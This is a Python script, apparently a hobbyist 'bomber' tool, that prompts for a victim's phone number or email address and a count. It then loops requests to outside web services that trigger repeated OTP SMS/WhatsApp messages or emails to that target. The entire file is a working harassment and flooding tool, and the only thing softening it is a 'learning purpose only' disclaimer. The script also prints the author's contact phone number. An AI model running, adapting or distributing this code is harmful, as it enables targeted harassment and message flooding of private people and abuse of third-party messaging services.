import subprocess
import time
import os
import sys

"""
Disclaimer:
           This tool is made for learning purpose only.
"""
try:
    import requests
except ImportError:
    print("[*] Installing requests...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests



g = "\033[92m"
r = "\033[0m"
b = "\033[34m"
red = "\033[31m"


def banner():

   b = r"""
 ____
| __ )  ___   ___  _ __ ___   ___ _ __
|  _ \ / _ \ / _ \| '_ ` _ \ / _ \ '__|
| |_) | (_) | (_) | | | | | |  __/ |
|____/ \___/ \___/|_| |_| |_|\___|_|

                By Errorking404
"""
   print(f"{g}{b}{r}")


def menu():
    print(f"{g}Enter 1 to use SMS & Whatsapp Boomer{r}")
    print(f"{g}Enter 2 to use EMAIL Boomer{r}")
    print(f"{g}Enter 3 to exit{r}")


def smsboom():
    num = input(f"{b}Enter target number. ex(03xxxx):{r}")
    url = f"http://otpguy.vercel.app/?num={num}"
    lim = int(input("Enter limit:"))
    i = 1
    for i in range(1, lim + 1):
        print(f"{g}Launching the Bomber{r}")
        time.sleep(60)
        print(f"{b}Bomb Launched{r}")
        resp = requests.get(url)
        #data = resp.json()
        #print(data)
        print(f"{g}{i}, Bomb hit the Target.{r}")


def email():
    print(f"{g}")
    mail = input("Enter target mail.e.g:(target@gmail.com):")
    lim = int(input("Enter limit:"))
    print("\033[0m")
    url = f"https://email-bmb.vercel.app/?mail={mail}"
    i = 1
    for i in range(1, lim + 1):
        print(f"{g}Launching Bomber. Please wait{r}")
        time.sleep(60)
        print(f"{b}Bomb Launched{r}")
        resp = requests.get(url)
        if resp.status_code == 200:
            print(f"{g}{i}, Bomb hit the target.{r}")
        else:
            print(f"{red}Error. Please contact owner at whatsapp{r}")
            print("{b}+923495025675{r}")


def choice():
    menu()
    choice = int(input("Enter choice:"))
    if choice == 1:
        smsboom()
    elif choice == 2:
        email()
    elif choice == 3:
        sys.exit(1)
    else:
        print("Wrong Choice. Try again")


banner()
choice()
